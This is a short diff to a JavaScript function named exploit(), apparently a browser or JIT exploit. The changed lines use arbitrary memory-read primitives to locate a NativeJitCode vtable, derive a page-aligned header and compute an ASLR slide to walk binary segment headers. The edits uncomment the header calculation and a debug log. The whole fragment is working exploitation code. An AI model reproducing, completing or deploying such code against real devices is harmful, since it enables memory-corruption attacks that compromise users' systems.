@@ -533,8 +533,8 @@ function exploit(){
         let v_tlb = memory.read_i64(exe_ptr,0);
         log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
-        log(“anchor” + anchor)
-       // var hdr1 = Sub(anchor, anchor.lo() & 0xfff);
+        log('anchor' + anchor)
+        var hdr1 = Sub(anchor, anchor.lo() & 0xfff);
         let cnt = 0;
         var ccc = 0;
         var vtab = 0x1B205A808;
@@ -554,7 +554,7 @@ function exploit(){
         //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
         var hdr = Add(0x180000000,slide);
-        //log(hdr + hdr1)
+        log(hdr + hdr1)
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
         var nsegs = memory.u32(Add(hdr, 0x14));
